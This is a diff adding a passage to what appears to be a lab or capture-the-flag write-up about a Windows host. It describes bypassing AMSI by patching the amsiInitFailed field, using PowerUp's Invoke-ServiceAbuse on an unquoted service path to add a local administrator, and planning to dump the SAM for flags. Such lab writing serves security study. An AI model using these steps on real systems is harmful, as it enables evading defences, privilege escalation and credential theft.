@@ -252,3 +252,157 @@ Testing the credentials against various services on the `WSRV` machine shows tha
 
 ![enum11](enum11.png)
 
+Next we authenticate to the server via `RDP`
+
+![enum12](enum12.png)
+
+After attempting to load `PowerUp.ps1` directly into memory on the server, `AMSI` blocked the script. Bummer! 😭
+
+![enum13](enum13.png)
+
+It means that Windows Defender is enabled
+
+![enum14](enum14.png)
+
+```powershell
+PS C:\Windows\Temp> Get-MpComputerStatus
+
+
+AMEngineVersion                  : 1.1.23100.2009
+AMProductVersion                 : 4.18.23100.2009
+AMRunningMode                    : Normal
+AMServiceEnabled                 : True
+AMServiceVersion                 : 4.18.23100.2009
+AntispywareEnabled               : True
+AntispywareSignatureAge          : 1010
+AntispywareSignatureLastUpdated  : 11/10/2023 10:32:12 AM
+AntispywareSignatureVersion      : 1.401.391.0
+AntivirusEnabled                 : True
+AntivirusSignatureAge            : 1010
+AntivirusSignatureLastUpdated    : 11/10/2023 10:32:12 AM
+AntivirusSignatureVersion        : 1.401.391.0
+BehaviorMonitorEnabled           : True
+ComputerID                       : 5C0032E4-2202-4752-8149-0677CFA10DFE
+ComputerState                    : 0
+DefenderSignaturesOutOfDate      : False
+DeviceControlDefaultEnforcement  : Unknown
+DeviceControlPoliciesLastUpdated : 1/1/1601 12:00:00 AM
+DeviceControlState               : Disabled
+FullScanAge                      : 4294967295
+FullScanEndTime                  :
+FullScanOverdue                  : False
+FullScanRequired                 : False
+FullScanSignatureVersion         :
+FullScanStartTime                :
+IoavProtectionEnabled            : True
+IsTamperProtected                : False
+IsVirtualMachine                 : True
+LastFullScanSource               : 0
+LastQuickScanSource              : 0
+NISEnabled                       : True
+NISEngineVersion                 : 1.1.23100.2009
+NISSignatureAge                  : 1010
+NISSignatureLastUpdated          : 11/10/2023 10:32:12 AM
+NISSignatureVersion              : 1.401.391.0
+OnAccessProtectionEnabled        : True
+ProductStatus                    : 524288
+QuickScanAge                     : 4294967295
+QuickScanEndTime                 :
+QuickScanOverdue                 : False
+QuickScanSignatureVersion        :
+QuickScanStartTime               :
+RealTimeProtectionEnabled        : True
+RealTimeScanDirection            : 0
+RebootRequired                   : False
+SmartAppControlExpiration        :
+SmartAppControlState             : Off
+TamperProtectionSource           : N/A
+TDTMode                          : N/A
+TDTSiloType                      : N/A
+TDTStatus                        : N/A
+TDTTelemetry                     : N/A
+TroubleShootingDailyMaxQuota     :
+TroubleShootingDailyQuotaLeft    :
+TroubleShootingEndTime           :
+TroubleShootingExpirationLeft    :
+TroubleShootingMode              :
+TroubleShootingModeSource        :
+TroubleShootingQuotaResetTime    :
+TroubleShootingStartTime         :
+PSComputerName                   :
+
+PS C:\Windows\Temp>
+```
+
+But... we can bypass this by patching the `amsiInitFailed` field in PowerShell's `System.Management.Automation.AmsiUtils` class.
+
+![enum15](enum15.png)
+
+> From the image, we can see that before patching, using the string amsiUtils triggers AMSI. After applying the patch, however, we can use the same string without triggering AMSI.
+
+With AMSI bypassed, we can now load and execute `PowerUp.ps1`.
+
+![enum16](enum16.png)
+
+PowerUp identified a potential privilege escalation vector: an unquoted service path.
+
+```bash
+ServiceName   : IntraSvc
+Path          : C:\Program Files\Internalprogram\intraprog.exe
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -ServiceName 'IntraSvc'
+```
+
+We can easily exploit this misconfiguration by leveraging PowerUp's `Invoke-ServiceAbuse` function.
+
+```
+PS C:\Users\cody.gardner> Invoke-ServiceAbuse -ServiceName 'IntraSvc'
+
+ServiceAbused Command
+------------- -------
+IntraSvc      net user john Password123! /add && net localgroup Administrators john /add
+
+
+PS C:\Users\cody.gardner> net users
+
+User accounts for \\WSRV
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest
+john
+The command completed successfully.
+
+PS C:\Users\cody.gardner> net users john
+User name                    john
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            8/22/2026 7:42:14 PM
+Password expires             10/3/2026 7:42:14 PM
+Password changeable          8/23/2026 7:42:14 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Users
+Global Group memberships     *None
+The command completed successfully.
+
+PS C:\Users\cody.gardner>
+```
+
+Now that a new user whose credential is known is created, we can dump the local SAM registry and login as `administrator` to get the flags.
+
+![enum17](enum17.png)
+![enum18](enum18.png)
